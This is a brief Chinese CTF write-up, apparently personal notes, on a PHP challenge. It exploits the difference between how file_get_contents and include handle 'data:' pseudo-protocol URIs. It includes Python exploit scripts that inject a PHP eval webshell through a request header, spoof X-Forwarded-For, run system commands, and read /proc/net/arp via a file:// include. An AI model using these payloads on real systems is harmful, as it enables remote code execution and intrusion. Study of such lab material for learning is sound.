tags:: [[CTF/伪协议]]

- # 思路
	- 使用file_get_contents和include处理伪协议时的差异进行RCE
- # 伪协议
	-
	- `data`伪协议可以省略掉`//`
	- `file_get_contents('data:127001/profile') == "127001"`
	- 但是选项`allow_url_include=Off`时``include('data:127001/profile')``会寻找文件夹`data:127001`下的`profile`文件
- # Exp
	- ```python
	  # url = "http://127.0.0.1:8081/"
	  url = "http://node4.buuoj.cn:29874/"
	  
	  r = base_post(url, headers = {
	      "Xxx": "<?php eval($_POST['data']);?>",
	      "X-Forwarded-For": "data:127.0.0.1"
	  }, params = {
	      "page": "data:127001/profile"
	  }, data = {
	      "data": "system('/get_flag');"
	  })
	  print(r.status_code)
	  print(r.text)
	  ```
- # 施工中
	- 传入GET参数hl可以看到源码
	- 有限制的文件include
		- ```python
		  # url = "http://127.0.0.1:8081/"
		  url = "http://node4.buuoj.cn:29874/"
		  
		  r = base_get(url, headers = {
		      "Xxx": "Aaa",
		      "X-Forwarded-For": "127.0.0.1"
		  }, params = {
		      "page": "file:///proc/net/arp"
		  })
		  print(r.text)
		  ```